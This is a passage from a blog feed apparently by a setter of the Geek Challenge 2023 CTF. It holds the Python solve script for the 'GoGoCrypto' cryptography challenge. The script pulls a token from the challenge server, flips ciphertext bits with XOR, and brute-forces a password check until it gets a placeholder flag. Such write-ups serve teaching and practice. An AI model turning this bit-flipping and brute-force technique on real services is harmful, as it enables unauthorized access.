</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512 </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl_request</span>(<span class="params">url, method=<span class="string">&#x27;GET&#x27;</span>, headers=<span class="literal">None</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> method.upper() == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            response = requests.put(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            response = requests.delete(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Unsupported HTTP method&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查请求是否成功</span></span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">url = <span class="string">&#x27;http://47.109.106.62:7842/&#x27;</span> </span><br><span class="line">response = requests.get(url) </span><br><span class="line">x = <span class="built_in">str</span>(response.headers)</span><br><span class="line"></span><br><span class="line">token = unquote(x.split(<span class="string">&quot;token&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line">token = dec(token) </span><br><span class="line">nonce = unquote(x.split(<span class="string">&quot;nonce&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line"></span><br><span class="line">c1, c2 = token[:<span class="built_in">len</span>(token)//<span class="number">2</span>], token[<span class="built_in">len</span>(token)//<span class="number">2</span>:] </span><br><span class="line">c1 = xor(xor(c1,<span class="string">b&#x27;\x10&#x27;</span>*<span class="number">16</span>),<span class="string">b&#x27;\x1f&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">form_data = &#123;</span><br><span class="line">    <span class="string">&quot;Rec&quot;</span>: enc(c1+c2).decode()</span><br><span class="line">&#125;</span><br><span class="line">res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/dec&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data) </span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>: enc(<span class="built_in">chr</span>(i).encode()).decode()+enc(sha512(dec(nonce)).digest()).decode()</span><br><span class="line">    &#125;</span><br><span class="line">    res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/check&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SYC&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res):</span><br><span class="line">        <span class="built_in">print</span>(res) </span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"><span class="comment"># &#123;&quot;check&quot;:&quot;true&quot;,&quot;msg&quot;:&quot;Your flag is: SYC&#123;AL3XEI_FAKE_FLAG&#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;本人参与极客大挑战2023的出题工作，主要负责密码学板块。&lt;/p&gt;
&lt;p&gt;对于GoGoCrypto这道反响比较高的题目，这里附上题解。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
